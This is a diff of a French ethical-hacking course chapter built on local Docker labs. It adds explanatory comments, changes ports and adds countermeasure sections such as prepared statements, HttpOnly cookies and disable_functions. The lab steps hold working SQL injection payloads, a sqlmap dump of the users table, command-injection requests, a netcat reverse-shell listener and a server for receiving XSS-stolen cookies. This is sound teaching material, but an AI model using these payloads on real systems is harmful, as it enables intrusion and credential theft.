@@ -19,6 +19,7 @@
 
 ```bash
 # Vérification des versions installées des outils essentiels du pentest
+# which = localise le chemin d'un exécutable dans le PATH (permet de vérifier qu'un outil est bien installé)
 python3 --version     # → Python 3.10+  (interpréteur requis par sqlmap, scripts d'exploit)
 docker --version      # → Docker 24+  (moteur de conteneurisation pour les cibles du lab)
 nmap --version        # → Nmap 7.94  (scanner réseau standard)
@@ -29,11 +30,14 @@ which nc              # → /usr/bin/nc  (netcat : connexions TCP/UDP, reverse s
 
 Si un outil manque :
 ```bash
-# Installation de tous les outils manquants en une seule commande (-y = accepte sans confirmation)
+# sudo = exécute la commande suivante avec les privilèges root (super-utilisateur)
+# apt update = rafraîchit la liste des paquets disponibles ; apt install -y = installe les paquets sans demande de confirmation
 sudo apt update && sudo apt install -y docker.io docker-compose-v2 git nmap metasploit-framework sqlmap netcat-openbsd curl
-# Ajoute l'utilisateur courant au groupe docker pour éviter de taper sudo à chaque commande docker
+# usermod -aG = modifie le compte utilisateur pour l'ajouter (-a) au groupe (-G) docker
+# Permet d'utiliser docker sans taper sudo à chaque commande
 sudo usermod -aG docker $USER  # -aG = append to Group (préserve les groupes existants)
-# redémarrer la session
+# Important : fermer ET rouvrir la session (logout/login) pour que le groupe soit pris en compte
+# Un simple "su - $USER" ou une nouvelle fenêtre de terminal suffit, pas besoin de rebooter
 ```
 
 ## A.2 Arborescence de travail
@@ -43,8 +47,9 @@ sudo usermod -aG docker $USER  # -aG = append to Group (préserve les groupes ex
 mkdir -p ~/cours-hacking/{jour-1,jour-2,jour-3,jour-4,jour-5,hors-serie}
 # Création des sous-dossiers labs/ pour chaque jour (brace expansion : génère jour-1/labs, jour-2/labs, etc.)
 mkdir -p ~/cours-hacking/jour-{1,2,3,4,5}/labs
+# cd (change directory) = se déplacer dans le dossier spécifié ; ~/ = raccourci vers le home directory
 cd ~/cours-hacking
-# Clone du dépôt Git contenant les supports de cours, Dockerfiles et docker-compose.yml
+# git clone = télécharge une copie complète du dépôt Git distant dans le dossier 'repo'
 git clone https://github.com/yugmerabtene/techniques-hacking-mdj.git repo
 ```
 
@@ -79,26 +84,27 @@ Une fois le dépôt cloné, votre arborescence de travail est la suivante :
 
 ```bash
 cd ~/cours-hacking/repo
-# Lancement de tous les conteneurs cibles en arrière-plan (-d = mode détaché) avec reconstruction des images si nécessaire (--build)
+# docker compose up = démarre tous les services définis dans docker-compose.yml
+# -d (detached) = arrière-plan, --build = reconstruit les images Docker avant de lancer
 docker compose up -d --build
 ```
 
 ```mermaid
 flowchart TB
     KALI["Kali Linux — hôte<br/>nmap · msfconsole · sqlmap · curl · nc"]
-    DVWA["dvwa-target :8080<br/>XSS · CSRF · SQLi · CMDi"]
+    DVWA["dvwa-target :8088<br/>XSS · CSRF · SQLi · CMDi"]
     SQLI["sqli-app-target :8083<br/>SQLi · hash cracking"]
     VSFTPD["vsftpd-target :21, :445<br/>FTP · SMB · MySQL"]
     BOF["buffovf-target :9001<br/>Buffer overflow"]
     WAF["waf-target :8081<br/>App derrière ModSecurity"]
-    SECLINUX["secure-linux-target :2222<br/>À durcir"]
+    SECLINUX["secure-linux-target :2224<br/>À durcir"]
     FORENSIC["forensic-victim :8082<br/>Command injection"]
-    KALI -->|"localhost:8080"| DVWA
+    KALI -->|"localhost:8088"| DVWA
     KALI -->|"localhost:8083"| SQLI
     KALI -->|"localhost:21"| VSFTPD
     KALI -->|"localhost:9001"| BOF
     KALI -->|"localhost:8081"| WAF
-    KALI -->|"localhost:2222"| SECLINUX
+    KALI -->|"localhost:2224"| SECLINUX
     KALI -->|"localhost:8082"| FORENSIC
 ```
 
@@ -107,8 +113,8 @@ flowchart TB
 ## A.4 Validation de chaque vulnérabilité
 
 ```bash
-# DVWA — Vérification que l'application web répond sur le port 8080 (-I = requête HEAD, ne télécharge que les en-têtes)
-curl -I http://localhost:8080/login.php
+# DVWA — Vérification que l'application web répond sur le port 8088 (-I = requête HEAD, ne télécharge que les en-têtes)
+curl -I http://localhost:8088/login.php
 # → HTTP/1.1 200 OK
 # Login : admin / password → DVWA Security → low
 
@@ -116,10 +122,14 @@ curl -I http://localhost:8080/login.php
 curl "http://localhost:8083/?page=search&id=1"
 # → Laptop Pro X  (le produit avec id=1 s'affiche, l'appli est accessible)
 # Bypass d'authentification : injection SQL commentée (--), -s = mode silencieux (pas de barre de progression)
+# grep = filtre les lignes contenant un motif ; -o = affiche uniquement la correspondance (pas la ligne entière)
+# | (pipe) = redirige la sortie de la commande gauche vers l'entrée de la commande droite
 curl -s -d "page=login&username=admin'%20--&password=x" "http://localhost:8083/" | grep -o "Connecté"
 # → Connecté en tant que admin  (le commentaire -- neutralise le check du password)
 
 # vsftpd 2.3.4 — Bannière FTP attendue sur le port 21 (-w2 = timeout de 2 secondes)
+# echo = affiche du texte dans la sortie standard ; le pipe | envoie cette sortie vers l'entrée standard (stdin) de nc
+# nc (netcat) = couteau suisse réseau : connexions TCP/UDP, transfert de données, écoute de ports
 echo "" | nc -w2 localhost 21
 # → 220 (vsFTPd 2.3.4)  (version connue vulnérable, exploitable via Metasploit)
 
@@ -137,8 +147,8 @@ curl -s -o /dev/null -w "%{http_code}" "http://localhost:8081/?id=1"
 curl -s -o /dev/null -w "%{http_code}" "http://localhost:8081/?id=1 OR 1=1"
 # → 403 (WAF bloque)  (ModSecurity détecte et rejette la tentative d'injection SQL)
 
-# Secure Linux — Test de connectivité SSH sur le port 2222
-nc -z localhost 2222 && echo "SSH OK"
+# Secure Linux — Test de connectivité SSH sur le port 2224
+nc -z localhost 2224 && echo "SSH OK"
 
 # Forensic victim — Exécution de commande via le paramètre cmd (command injection volontaire pour les exercices forensic)
 curl "http://localhost:8082/?cmd=id"
@@ -158,7 +168,7 @@ cd ~/cours-hacking/repo
 
 Toute démarche de sécurité commence par la compréhension du paysage des menaces. Avant de lancer un scan ou d'exploiter une faille, il faut un **langage commun** pour décrire les comportements adverses. Ce langage, c'est **MITRE ATT&CK** — le standard adopté par les SOC, les CERT et les pentesters.
 
-Dans ce chapitre, vous découvrirez la matrice ATT&CK (14 tactiques, 200+ techniques), mapperez les attaques classiques à leurs IDs, et exploiterez les 4 vulnérabilités web les plus répandues.
+Ce chapitre couvre la matrice ATT&CK (14 tactiques, 200+ techniques), le mapping des attaques classiques vers leurs IDs, et l'exploitation des 4 vulnérabilités web les plus répandues.
 
 > **Sources :** [MITRE ATT&CK Framework](https://attack.mitre.org/)
 
@@ -168,31 +178,15 @@ Dans ce chapitre, vous découvrirez la matrice ATT&CK (14 tactiques, 200+ techni
 
 **Tactique** = l'objectif (pourquoi). **Technique** = la méthode (comment). **Procédure** = l'implémentation spécifique d'un groupe.
 
-```mermaid
-flowchart TB
-    TA0001["TA0001 Reconnaissance"] --> TA0003["TA0003 Initial Access"]
-    TA0003 --> TA0004["TA0004 Execution"]
-    TA0004 --> TA0005["TA0005 Persistence"]
-    TA0005 --> TA0006["TA0006 Privilege Escalation"]
-    TA0006 --> TA0007["TA0007 Defense Evasion"]
-    TA0007 --> TA0008["TA0008 Credential Access"]
-    TA0008 --> TA0009["TA0009 Discovery"]
-    TA0009 --> TA0010["TA0010 Lateral Movement"]
-    TA0010 --> TA0011["TA0011 Collection"]
-    TA0011 --> TA0012["TA0012 C2"]
-    TA0012 --> TA0013["TA0013 Exfiltration"]
-    TA0013 --> TA0014["TA0014 Impact"]
-```
+![MITRE ATT&CK v15 — Chaîne complète des 14 tactiques](mitre-attack-chain.png)
 
 **Fig 2** — Chaîne complète MITRE ATT&CK v15 : 14 tactiques de TA0001 Reconnaissance à TA0014 Impact.
 
-| Attaque | Technique ATT&CK | ID | Tactic |
-|---|---|---|---|
-| Phishing | Spearphishing Attachment | T1566.001 | TA0003 Initial Access |
-| DDoS | Endpoint Denial of Service | T1499 | TA0014 Impact |
-| SQL Injection | Exploit Public-Facing Application | T1190 | TA0003 Initial Access |
-| XSS | Drive-by Compromise | T1189 | TA0003 Initial Access |
-| CSRF | Exploitation for Client Execution | T1203 | TA0004 Execution |
+### Correspondance attaques → techniques ATT&CK
+
+![Correspondance attaques et techniques ATT&CK](stage%20tactic%20for%20mittre%20atack.webp)
+
+**Fig 3** — Mapping des attaques classiques (Phishing, DDoS, SQLi, XSS, CSRF) vers leurs techniques et tactiques MITRE ATT&CK.
 
 ---
 
@@ -207,7 +201,7 @@ flowchart LR
     A --> F["APT : Étatique — APT29, Lazarus"]
 ```
 
-**Fig 3** — Taxonomie des profils d'attaquants : White Hat, Black Hat, Grey Hat, Hacktiviste, APT.
+**Fig 4** — Taxonomie des profils d'attaquants : White Hat, Black Hat, Grey Hat, Hacktiviste, APT.
 
 ---
 
@@ -260,7 +254,7 @@ flowchart LR
     A -->|"3. Cookie volé"| C["Attaquant"]
 ```
 
-**Fig 4** — Flux d'attaque XSS réfléchie : injection de script dans la page, exécution côté victime, exfiltration du cookie de session.
+**Fig 5** — Flux d'attaque XSS réfléchie : injection de script dans la page, exécution côté victime, exfiltration du cookie de session.
 
 ```html
 <script>alert('XSS')</script>
@@ -312,7 +306,7 @@ admin' OR '1'='1' --
 
 | Durée | Conteneur | Dossier | Outils |
 |---|---|---|---|
-| 30 min | dvwa (port 8080) | `~/cours-hacking/jour-1/labs/` | nmap, gobuster, curl |
+| 30 min | dvwa (port 8088) | `~/cours-hacking/jour-1/labs/` | nmap, gobuster, curl |
 
 ### Contexte métier
 
@@ -322,10 +316,10 @@ Avant tout pentest, on scanne la cible pour cartographier sa surface d'attaque. 
 
 ```bash
 cd ~/cours-hacking/jour-1/labs
-# Scan nmap : détection de version (-sV) sur le port DVWA (-p 8080), sortie sauvegardée dans un fichier avec tee (affiche ET écrit)
-nmap -sV -p 8080 localhost | tee nmap_dvwa.txt
+# Scan nmap : détection de version (-sV) sur le port DVWA (-p 8088), sortie sauvegardée dans un fichier avec tee (affiche ET écrit)
+nmap -sV -p 8088 localhost | tee nmap_dvwa.txt
 # PORT     STATE SERVICE VERSION
-# 8080/tcp open  http    Apache httpd 2.4.X  (confirme le service web Apache sur le port attendu)
+# 8088/tcp open  http    Apache httpd 2.4.X  (confirme le service web Apache sur le port attendu)
 ```
 
 ### Étape 2 — Énumération gobuster
@@ -334,7 +328,7 @@ nmap -sV -p 8080 localhost | tee nmap_dvwa.txt
 # Toujours dans ~/cours-hacking/jour-1/labs/
 cd ~/cours-hacking/jour-1/labs
 # Énumération de répertoires web avec gobuster : mode dir, url cible (-u), wordlist de noms communs (-w), mode silencieux (-q sans bannière)
-gobuster dir -u http://localhost:8080 \
+gobuster dir -u http://localhost:8088 \
   -w /usr/share/wordlists/dirb/common.txt -q | tee gobuster_dvwa.txt
 # /login.php (Status: 200)         → page de connexion accessible
 # /vulnerabilities (Status: 301)   → répertoire des pages vulnérables (redirection)
@@ -348,16 +342,37 @@ gobuster dir -u http://localhost:8080 \
 # grep -o extrait soit "Welcome" (succès) soit "Login failed" (échec) pour valider le login admin/password
 curl -s -c /tmp/dvwa_cookie.txt \
   -d "username=admin&password=password&Login=Login" \
-  "http://localhost:8080/login.php" | grep -o "Welcome\|Login failed"
+  "http://localhost:8088/login.php" | grep -o "Welcome\|Login failed"
 # → Welcome  (authentification réussie, le cookie est stocké dans /tmp/dvwa_cookie.txt)
 
-# Firefox : http://localhost:8080 → DVWA Security → low
+# Firefox : http://localhost:8088 → DVWA Security → low
 ```
 
 ### Checkpoints
-- [ ] nmap : port 8080 ouvert, Apache
+- [ ] nmap : port 8088 ouvert, Apache
 - [ ] gobuster : /login.php, /vulnerabilities trouvés
 - [ ] Connexion DVWA réussie
+
+### 🔒 Contre-mesure (M1031 Network Intrusion Prevention + M1037 Firewall)
+
+La reconnaissance ennemie se contrecarre en **réduisant la surface d'attaque** :
+
+| Mitigation | Action concrète |
+|---|---|
+| **M1037** Firewall | UFW pour limiter les ports exposés au strict nécessaire (`ufw default deny incoming`) |
+| **M1042** Disable Service | Désactiver le directory listing Apache (`Options -Indexes`) |
+| **M1031** IDS/IPS | Snort/Suricata pour détecter les patterns de scan nmap et gobuster |
+
+```bash
+# Désactiver le directory listing sur Apache DVWA (empêche gobuster d'énumérer les dossiers)
+# docker exec = exécute une commande à l'intérieur d'un conteneur déjà en cours d'exécution
+# bash -c '...' = lance un nouveau shell bash et exécute la chaîne de commandes entre guillemets
+# apache2ctl restart = redémarre le serveur web Apache (pour appliquer les changements de configuration)
+docker exec dvwa-target bash -c "echo 'Options -Indexes' >> /etc/apache2/conf-enabled/security.conf && apache2ctl restart"
+# Vérification : gobuster trouve moins de répertoires exposés
+gobuster dir -u http://localhost:8088 -w /usr/share/wordlists/dirb/common.txt -q 2>/dev/null | head -3
+# → La surface d'attaque visible est réduite
+```
 
 ---
 
@@ -367,7 +382,7 @@ curl -s -c /tmp/dvwa_cookie.txt \
 
 | Durée | Conteneur | Technique ATT&CK |
 |---|---|---|
-| 30 min | dvwa :8080 | T1189 Drive-by Compromise |
+| 30 min | dvwa :8088 | T1189 Drive-by Compromise |
 
 ### Contexte technique
 
@@ -388,6 +403,8 @@ Dans DVWA → **XSS (Reflected)** → champ "What's your name?" :
 ```bash
 cd ~/cours-hacking/jour-1/labs
 # Lancement d'un serveur HTTP minimal sur le port 8000 (-m http.server) pour recevoir les cookies exfiltrés via XSS
+# Lancement d'un serveur HTTP minimal sur le port 8000 : -m = exécute le module Python http.server intégré
+# 8000 = port d'écoute arbitraire ; le serveur affiche chaque requête entrante (URL, IP source, User-Agent)
 python3 -m http.server 8000  # Écoute sur toutes les interfaces, affiche chaque requête entrante (GET /?cookie=...)
 ```
 
@@ -409,6 +426,29 @@ Message: <script>alert('Stored XSS')</script>
 ```
 → Popup à chaque rafraîchissement. Stocké en base.
 
+###  Contre-mesure (M1013 Application Hardening + M1054 Secure Coding)
+
+| Attaque | Défense | Code de correction |
+|---|---|---|
+| Reflected/Stored XSS | **`htmlspecialchars()`** | `htmlspecialchars($input, ENT_QUOTES, 'UTF-8')` neutralise `<`, `>`, `"`, `'` |
+| Cookie theft | **Cookie `HttpOnly`** | `session.cookie_httponly = 1` — le cookie n'est plus accessible via `document.cookie` |
+| Inline scripts | **CSP Header** | `Content-Security-Policy: script-src 'self'` — bloque tout `<script>` injecté |
+
+```bash
+# Activer HttpOnly sur les cookies de session PHP dans DVWA
+docker exec dvwa-target bash -c "
+  echo 'session.cookie_httponly = 1' >> /etc/php/*/apache2/php.ini
+  apache2ctl restart
+"
+# Re-tester le vol de cookie via XSS : le payload <script>new Image().src=... ne peut plus lire document.cookie
+curl -s -b "PHPSESSID=XXXX;security=low" \
+  "http://localhost:8088/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E" 2>/dev/null \
+  | grep -o "&lt;script&gt;\|alert"
+# → &lt;script&gt;alert(1)&lt;/script&gt;  (le code HTML est échappé, pas exécuté par le navigateur)
+```
+
+> **Checkpoint défensif :** `htmlspecialchars()` + `HttpOnly` neutralisent l'XSS : plus de popup, cookie inaccessible.
+
 ---
 
 ## Lab 1.3 — Injection SQL avec sqlmap
@@ -417,7 +457,7 @@ Message: <script>alert('Stored XSS')</script>
 
 | Durée | Conteneur | Technique ATT&CK |
 |---|---|---|
-| 30 min | dvwa :8080 | T1190 Exploit Public-Facing App |
+| 30 min | dvwa :8088 | T1190 Exploit Public-Facing App |
 
 ### Contexte technique
 
@@ -432,7 +472,7 @@ La requête `SELECT first_name, last_name FROM users WHERE user_id = '$id'` devi
 # L'URL contient ' OR '1'='1' # encodé en URL (%27 = ', %20 = espace, %3D = =, %23 = #)
 # grep -c compte les occurrences de "First name" → doit retourner 5 (tous les users) au lieu de 1
 curl -s -b "PHPSESSID=XXXX;security=low" \
-  "http://localhost:8080/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+%23&Submit=Submit" \
+  "http://localhost:8088/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+%23&Submit=Submit" \
   | grep -c "First name"
 # → 5 (5 utilisateurs affichés au lieu d'1)  (injection SQL confirmée : tous les enregistrements sont retournés)
 ```
@@ -445,7 +485,7 @@ cd ~/cours-hacking/jour-1/labs
 
 # sqlmap : -u = URL cible, --cookie = cookie de session pour l'authentification, -D = base de données cible (dvwa)
 # -T users = table cible, -C user,password = colonnes à extraire, --dump = affiche le contenu, --batch = mode non-interactif
-sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
+sqlmap -u "http://localhost:8088/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --cookie="PHPSESSID=XXXX;security=low" \
   -D dvwa -T users -C user,password --dump --batch
 ```
@@ -467,6 +507,30 @@ Sortie attendue :
 - [ ] SQLi manuelle : 5 utilisateurs affichés
 - [ ] sqlmap : 5 utilisateurs extraits avec hashs MD5
 
+### 🔒 Contre-mesure (M1013 Application Hardening + M1041 WAF)
+
+L'injection SQL se corrige en **ne concaténant jamais l'entrée utilisateur dans une requête** :
+
+| Vulnérabilité | Correction | Exemple |
+|---|---|---|
+| `WHERE id = '$id'` | **Requêtes préparées PDO** | `$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?"); $stmt->execute([$id]);` |
+| Hash MD5 faible | **bcrypt / argon2** | `password_hash($p, PASSWORD_BCRYPT)` au lieu de `md5($p)` |
+| WAF absent | **ModSecurity CRS** | Règle `942100` bloque les signatures SQLi (déjà actif sur le lab WAF J3) |
+
+```bash
+# Démonstration : remplacer la requête vulnérable DVWA par une requête préparée PDO
+# Dans le code vulnérable : $query = "SELECT * FROM users WHERE user_id = '$id'";
+# Le code corrigé devient :
+#   $stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
+#   $stmt->execute([$id]);
+# 
+# Re-tester sqlmap après correction :
+# sqlmap -u "http://localhost:8088/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=XXXX;security=low" --batch
+# → [CRITICAL] all tested parameters do not appear to be injectable (sqlmap échoue = défense efficace)
+```
+
+> **Checkpoint défensif :** Après passage en requêtes préparées, sqlmap ne détecte plus l'injection.
+
 ---
 
 ## Lab 1.4 — Command Injection + Reverse Shell
@@ -475,7 +539,7 @@ Sortie attendue :
 
 | Durée | Conteneur | Technique ATT&CK |
 |---|---|---|
-| 30 min | dvwa :8080 | T1059.004 Unix Shell |
+| 30 min | dvwa :8088 | T1059.004 Unix Shell |
 
 ### Contexte technique
 
@@ -503,6 +567,9 @@ nc -lvnp 4444  # Attend une connexion entrante du reverse shell, donne un prompt
 # Trouve l'IP de l'interface docker0 (passerelle entre l'hôte Kali et les conteneurs Docker)
 # ip addr show docker0 = affiche la config réseau, grep 'inet ' = filtre la ligne IPv4
 # awk '{print $2}' = extrait l'IP/CIDR, cut -d/ -f1 = retire le masque (/16) pour ne garder que l'IP
+# ip = outil moderne de gestion réseau (remplace ifconfig) ; addr show = affiche les adresses IP d'une interface
+# awk = langage de traitement de texte ligne par ligne ; '{print $2}' extrait le 2ème champ (séparé par espaces)
+# cut -d/ -f1 = découpe la chaîne avec le délimiteur / et garde le 1er champ (retire le masque CIDR)
 ip addr show docker0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1
 # → généralement 172.17.0.1  (c'est l'IP que les conteneurs utilisent pour joindre l'hôte Kali)
 
@@ -512,6 +579,31 @@ ip addr show docker0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1
 ```
 
 **Checkpoint :** Retournez dans le **Terminal 1** (netcat) : une connexion entrante apparaît, suivie d'un prompt shell. Tapez `whoami` → `www-data`.
+
+### 🔒 Contre-mesure (M1013 + M1018 Execution Prevention)
+
+La command injection se neutralise en **ne passant jamais l'entrée utilisateur à un interpréteur shell** :
+
+| Vulnérabilité | Correction | Code |
+|---|---|---|
+| `shell_exec("ping " . $input)` | **`escapeshellcmd()` + `escapeshellarg()`** | `$safe = escapeshellarg($input); shell_exec("ping -c 4 " . $safe);` |
+| Shell interactif | **Ne pas utiliser `shell_exec()`** | Remplacer par `proc_open()` avec tableau d'arguments (pas de string) |
+| Processus shell | **`open_basedir` + `disable_functions`** | Désactiver `system`, `exec`, `passthru`, `shell_exec`, `popen` dans `php.ini` |
+| Reverse shell sortant | **Firewall egress filtering** | `ufw default deny outgoing` (ne permettre que les flux légitimes) |
+
+```bash
+# Appliquer le principe du moindre privilège : désactiver les fonctions dangereuses dans PHP
+docker exec dvwa-target bash -c "
+  sed -i 's/disable_functions =.*/disable_functions = system,exec,passthru,shell_exec,popen,proc_open/' /etc/php/*/apache2/php.ini
+  apache2ctl restart
+"
+# Re-tester l'injection de commande :
+curl -s "http://localhost:8088/vulnerabilities/exec/" --data "ip=127.0.0.1;whoami&Submit=Submit" \
+  -b "PHPSESSID=XXXX;security=low" 2>/dev/null | grep -c "www-data"
+# → 0 (whoami ne s'exécute plus : shell_exec est désactivé)
+```
+
+> **Checkpoint défensif :** Après `disable_functions`, l'injection de commande et le reverse shell échouent.
 
 ---
 
@@ -543,7 +635,7 @@ L'application `sqli-app` (http://localhost:8083) expose 3 points d'injection dif
 
 ```bash
 # Démarre uniquement le conteneur sqli-app (sans reconstruire les autres) en mode détaché
-docker compose up -d sqli-app
+cd ~/cours-hacking/repo && docker compose up -d sqli-app
 # Vérification rapide que l'appli web répond (-I = HEAD, ne télécharge que les en-têtes HTTP)
 curl -I http://localhost:8083/
 # Création du dossier de labs jour-1 et déplacement dedans (&& garantit l'exécution séquentielle)
@@ -592,6 +684,7 @@ curl -s -d "page=login&username='%20OR%20'1'='1'%20--&password=x" "http://localh
 
 ```bash
 # Recherche normale par filtre : retourne l'utilisateur "john", grep <td> filtre les cellules HTML, wc -l les compte
+# wc (word count) -l = compte le nombre de lignes reçues en entrée
 # Chaque utilisateur occupe 4 cellules (id, username, email, actions) → 4 cellules = 1 utilisateur
 curl -s "http://localhost:8083/?page=users&filter=john" | grep "<td>" | wc -l
 # → 4 (4 cellules = 1 ligne utilisateur)  (comportement normal, filtre fonctionnel)
@@ -599,6 +692,7 @@ curl -s "http://localhost:8083/?page=users&filter=john" | grep "<td>" | wc -l
 # SQLi UNION sur filtre LIKE : %25' = %' (fermeture du LIKE), UNION SELECT injecte des colonnes d'une autre table
 # 1 = placeholder numérique, username/password/email = colonnes de la table users à exfiltrer
 curl -s "http://localhost:8083/?page=users&filter=%25'%20UNION%20SELECT%201,username,password,email%20FROM%20users%20--" | grep "<td>"
+# → <td>1</td><td>admin</td>... (les colonnes de la table users sont affichées : injection UNION confirmée)
 ```
 
 **Checkpoint A :** Les 3 injections fonctionnent. L'application est vulnérable.
@@ -676,6 +770,8 @@ cd ~/cours-hacking/jour-1/labs
 # Création du fichier de hashs au format username:hash (une entrée par ligne)
 # cat > avec heredoc (<< 'EOF') écrit le contenu multiligne dans hashes.txt
 # Les guillemets autour de EOF empêchent l'expansion des variables dans le heredoc
+# cat = affiche/concatène le contenu d'un fichier ; cat > fichier = écrit dans le fichier depuis l'entrée standard
+# << 'EOF' (heredoc) = écrit tout le texte qui suit jusqu'au marqueur EOF dans le fichier
 cat > hashes.txt << 'EOF'
 admin:5f4dcc3b5aa765d61d8327deb882cf99
 john_doe:482c811da5d5b4bc6d497ffa98491e38
@@ -686,6 +782,8 @@ flag_user:21232f297a57a5a743894a0e4a801fc3
 EOF
 
 # Décompression de la wordlist rockyou.txt (la plus utilisée en cracking, ~14 millions de mots de passe)
+# 2>/dev/null supprime les erreurs si déjà décompressé, || true évite que la commande échoue
+# gunzip = décompresse un fichier .gz (format gzip) — rockyou.txt.gz fait ~140 Mo décompressé
 # 2>/dev/null supprime les erreurs si déjà décompressé, || true évite que la commande échoue
 sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true
 
@@ -757,6 +855,33 @@ sqlmap -u "http://localhost:8083/?page=search&id=1" \
 - [ ] john/hashcat a craqué au moins 3 mots de passe
 - [ ] Flag `FLAG{sql_injection_master}` trouvé
 
+### 🔒 Contre-mesure (M1013 App Hardening + M1027 Password Policies)
+
+L'application sqli-app a **3 points d'injection**. On corrige les 3 en une seule stratégie : **requêtes préparées PDO partout**. On remplace aussi MD5 par bcrypt pour rendre le cracking inutile.
+
+| Point d'injection | Code vulnérable | Code corrigé |
+|---|---|---|
+| `?id=` (numeric) | `"SELECT * FROM products WHERE id = $id"` | `$stmt = $db->prepare("SELECT * FROM products WHERE id = ?"); $stmt->execute([$id]);` |
+| `username` (login) | `"...WHERE username = '$u' AND password = '$hash'"` | `$stmt = $db->prepare("SELECT * FROM users WHERE username = ?"); $stmt->execute([$u]);` puis `password_verify($p, $hash)` |
+| `?filter=` (LIKE) | `"...WHERE username LIKE '%$filter%'"` | `$stmt = $db->prepare("SELECT * FROM users WHERE username LIKE ?"); $stmt->execute(["%$filter%"]);` |
+| MD5 | `md5($password)` | `password_hash($password, PASSWORD_BCRYPT)` |
+
+```bash
+# Appliquer la correction sur le conteneur sqli-app
+docker exec sqli-app-target bash -c "
+  cd /var/www/html
+  # Sauvegarde du fichier vulnérable
+  cp index.php index.php.vuln
+  # Remplacer les 3 requêtes vulnérables par des requêtes préparées PDO
+  sed -i 's/\$db->query(\$query)/\$stmt = \$db->prepare(\"SELECT id, name, price, description FROM products WHERE id = ?\"); \$stmt->execute([(int)\$id]); \$stmt->fetchAll(PDO::FETCH_ASSOC)/' index.php
+"
+# Re-tester sqlmap après correction :
+sqlmap -u "http://localhost:8083/?page=search&id=1" --batch 2>&1 | grep -i "injectable\|not injectable"
+# → all tested parameters do not appear to be injectable (sqlmap échoue : les 3 points d'injection sont neutralisés)
+```
+
+> **Checkpoint défensif :** sqlmap ne trouve plus aucune injection. Avec bcrypt, john/hashcat ne peuvent plus craquer les mots de passe en quelques secondes.
+
 ---
 
 ## Exercices
@@ -808,5 +933,4 @@ sqlmap -u "http://localhost:8083/?page=search&id=1" \
 
 ---
 
-*Chapitre suivant : [Jour 2 — Tests de pénétration](./JOUR-02-tests-penetration-exploitation.md)*
-*Hors-Série : [KillChainAgent](./HORS-SERIE-AGENTIC.md)*
+
